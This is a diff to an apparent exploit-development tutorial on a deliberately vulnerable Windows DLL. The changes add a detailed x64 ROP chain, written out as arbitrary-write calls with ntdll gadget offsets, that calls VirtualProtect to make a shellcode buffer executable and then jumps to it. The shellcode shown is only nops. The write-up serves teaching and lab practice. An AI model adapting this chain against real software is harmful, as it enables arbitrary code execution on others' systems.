@@ -44,13 +44,15 @@ printf("shellcodeBufferAddr: 0x%p\n", (void*)shellcodeBufferAddr);
 
 This is fairly straightforward. We create a buffer, fill it with nops (`0x90`), then use the DLL function to allocate it, and finally read the address of the buffer.
 
-Why not just allocate memory on the heap and use the returned address in our exploit? Remember, we are simulating a remote exploit, the DLL is loaded in to the process for convenience but the techniquese used are similar to those against a remote binary. If we allocate a buffer in our exploit process then a remote binary will not be able to access it.
+Why not just allocate memory on the heap and use the returned address in our exploit? Remember, we are simulating a remote exploit, the DLL is loaded in to the process for convenience but the techniques used are similar to those against a remote binary. If we allocate a buffer in our exploit process then a remote binary will not be able to access it.
 
-Testing this in WinDbg shows the shellcode allocated to the address leaked using the arbitrary read:
+Testing this in `WinDbg` shows the shellcode allocated to the address leaked using the arbitrary read:
 
 <img width="1203" alt="Screenshot 2025-01-27 at 08 59 37" src="https://github.com/user-attachments/assets/a656c579-5ec3-40e3-a826-1ad90027e484" style="border: 1px solid black;" />
 
 We have a shellcode buffer, and a reference to it.
+
+**Note:** I could have looked for a code cave within the binary or another module and wrte the shellcode to it using the arbitrary write, I might look at that another time and examine what mitigations might prevent this.
 
 ## Arbitrarily Writing a ROP Chain
 
@@ -116,7 +118,7 @@ ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 0x28;   
 ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa3060); index += 8;         // int3 ; ret ; (debug)
 ```
 
-Using the `__fastcall` calling convention we assign the parameters to `rcx` and `rbx` (there is only two). Several things we should note are that `lpProcName` points to the string we wrote to the offset of `0x500`, `hModule` uses the base address of `kernel32` we resolved earlier, and we need to recover the stack using an `add rsp, 0x20` gadget (read about `x64` calling conventions if you are interested why).
+Using the `__fastcall` calling convention we assign the arguments to `rcx` and `rdx` (there are only two). Several things we should note are that `lpProcName` points to the string we wrote to the offset of `0x500`, `hModule` uses the base address of `kernel32` we resolved earlier, and we need to recover the stack using an `add rsp, 0x20` gadget after the call is completed (read about `x64` calling conventions if you are interested why).
 
 At the end of the call the address of `VirtualProtect` should be in `rax`. I always add an `int3` gadget in a ROP chain when I want to debug 'things', always remembering to remove it when moving on to the next task:
 
@@ -126,7 +128,52 @@ Perfect, the address is in `rax`, next we can call it in our ROP chain.
 
 ## VirtualProtect
 
+We need to set the shellcode memory allocation to `PAGE_EXECUTE_READWRITE`, this is so our shellcode can be executed. This chain is a little bit longer, but only because `VirtualProtect` takes four arguments:
+
+```c
+// VirtualProtect
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x9215b); index += 8;         // pop rcx ; ret ;
+ArbitraryWrite(generalBufferAddr + index, shellcodeBufferAddr); index += 8;         // lpAddress
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb17); index += 8;         // pop rdx ; pop r11 ; ret ;
+ArbitraryWrite(generalBufferAddr + index, 0x1000); index += 8;                      // dwSize
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x20107); index += 8;         // pop r8; ret;
+ArbitraryWrite(generalBufferAddr + index, 0x40); index += 8;                        // flNewProtect (PAGE_EXECUTE_READWRITE)
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x8fb14); index += 8;         // pop r9; pop r10; pop r11; ret;
+ArbitraryWrite(generalBufferAddr + index, generalBufferAddr + 0x550); index += 8;   // flOldProtect
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r10
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 8;          // Junk in r11
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa33ac); index += 8;         // push rax; ret; (VirtualProtect will be called)
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0x84ab8); index += 8;         // add rsp, 0x20; pop r15; ret;
+ArbitraryWrite(generalBufferAddr + index, 0x4141414141414141); index += 0x28;       // Junk in r15 and Shadow Space
+
+ArbitraryWrite(generalBufferAddr + index, ntdllBase + 0xa3060); index += 8;         // int3 ; ret ; (debug)
+```
+
+We move the address of the shellcode buffer into `rcx` (`lpAddress`). We move `0x1000` into `rdx` (`dwSize`). `r8` is the `flNewProtect` argument, so we pass in `0x40` (`PAGE_EXECUTE_READWRITE`), and finally we just pass in a writeable location on the general buffer we allocated into `r9` (`flOldProtect`).
+
+We push `rax` onto the stack (the address of `VirtualProtect`) which means it will be called. When the function returns we reallign the stack as we did before. Finally, we can place an `int3` gadget for debugging. When debugging I examined the shellcode memory protections before the call:
+
+<img width="1213" alt="Screenshot 2025-01-27 at 09 37 03" src="https://github.com/user-attachments/assets/791c6a53-6724-40d4-9509-0f523e4696a6" style="border: 1px solid black;" />
+
+I also examined the protections after the call:
+
+<img width="1209" alt="Screenshot 2025-01-27 at 09 37 29" src="https://github.com/user-attachments/assets/e92b8470-99f7-4297-bb20-cf6fcb5834cc" style="border: 1px solid black;" />
+
+All that is left to do is execute the shellcode by placing the buffer address next on the stack.
+
+```c
+// shellcode
+ArbitraryWrite(generalBufferAddr + index, shellcodeBufferAddr); index += 8;  // shellcode address
+```
+
+Let's go!
+
 ## Testing the Exploit
+
+After testing in the debugger, I do a full test outside of `WinDbg` and the reults are wonderful:
+
+<img width="1174" alt="Screenshot 2025-01-27 at 09 40 11" src="https://github.com/user-attachments/assets/335b9b32-6254-416e-8718-9ca8c191c8e6" style="border: 1px solid black;" />
 
 ## What Next?
 
